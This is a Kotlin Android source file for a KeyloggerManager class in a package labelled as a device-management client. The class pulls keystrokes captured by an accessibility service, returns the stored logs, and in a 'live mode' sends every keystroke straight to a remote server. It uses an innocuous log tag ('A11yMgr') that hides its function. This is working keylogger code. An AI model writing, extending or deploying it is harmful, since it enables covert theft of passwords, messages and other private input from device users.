package com.mdm.client.keylogger

import android.content.Context
import android.util.Log
import com.mdm.client.config.AppConfig
import com.mdm.client.network.ApiClient
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch

class KeyloggerManager(
    private val context: Context,
    private val apiClient: ApiClient
) {
    companion object {
        private const val TAG = "A11yMgr"
    }

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)

    init {
        // Wire the live keystroke callback — fires whenever the service receives a keystroke
        // while in live mode, and pushes it immediately to the server.
        KeyloggerAccessibilityService.instance?.onLiveKeystroke = ::onLiveKeystroke
    }

    fun getAllKeystrokes(): List<Map<String, Any>> {
        val service = KeyloggerAccessibilityService.instance
        return service?.getAllKeyloggerData() ?: emptyList()
    }

    fun enableLive(): Map<String, Any> {
        val service = KeyloggerAccessibilityService.instance
        return if (service != null) {
            service.liveMode = true
            service.onLiveKeystroke = ::onLiveKeystroke
            mapOf("status" to "success", "live_mode" to true)
        } else {
            mapOf("status" to "error", "message" to "Accessibility service not active")
        }
    }

    fun disableLive(): Map<String, Any> {
        val service = KeyloggerAccessibilityService.instance
        service?.liveMode = false
        return mapOf("status" to "success", "live_mode" to false)
    }

    fun isLive(): Boolean = KeyloggerAccessibilityService.instance?.liveMode == true

    private fun onLiveKeystroke(entry: Map<String, Any>) {
        scope.launch {
            try {
                val deviceId = AppConfig.getDeviceId(context)
                apiClient.pushKeystrokes(deviceId, listOf(entry), live = true)
            } catch (e: Exception) {
                Log.e(TAG, "Live push failed: ${e.message}")
            }
        }
    }
}
